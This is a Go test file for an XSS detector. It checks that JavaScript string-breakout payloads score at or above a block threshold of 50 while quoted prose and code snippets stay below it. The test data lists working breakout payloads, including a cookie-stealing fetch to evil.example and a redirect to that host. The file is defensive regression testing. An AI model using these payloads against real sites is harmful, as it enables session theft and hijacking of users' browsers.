package xss

import "testing"

func xssScore(input string) int {
	total := 0
	for _, f := range Detect(input, "query") {
		total += f.Score
	}
	return total
}

// Regression: a breakout from a JavaScript string context needs no tag, so
// `';alert(1)//` scored 0 although it executes when reflected into
// `var q = '<input>';`.
func TestJSStringBreakoutBlocked(t *testing.T) {
	for _, s := range []string{
		"';alert(1)//",
		"'-alert(1)-'",
		`"+alert(1)+"`,
		`");alert(1);//`,
		"';alert`1`//",
		"'; fetch('//evil.example/'+document.cookie)//",
		"'||window.location='//evil.example'//",
		"\\';setTimeout('alert(1)')//",
		"';top['al'+'ert'](1)//",
		"`;prompt(1)//",
	} {
		if got := xssScore(s); got < 50 {
			t.Errorf("%q scored %d, want at least the block threshold (50)", s, got)
		}
	}
}

// Prose with quotes, punctuation and the same words stays clean.
func TestJSStringBreakoutIgnoresProse(t *testing.T) {
	for _, s := range []string{
		"Click 'Save'; then confirm the dialog",
		"The 'alert' level is higher than 'warning'",
		"He said \"stop\", then left the window open",
		"Set the 'location' field, then press OK",
		"it's 'top' - not 'bottom'",
		"Use 'prompt' + 'confirm' wording in the UI copy",
		"\"fetch\" is the new API; XMLHttpRequest is older",
		// Developer posts quoting code close their own literals.
		`const s = "a"; window.addEventListener('load', init);`,
		"In React you write const el = 'root'; document.getElementById(el)",
		"Try `npm run build`; location.reload() usually fixes the stale cache.",
	} {
		if got := xssScore(s); got >= 50 {
			t.Errorf("%q scored %d, want below the block threshold (50)", s, got)
		}
	}
}
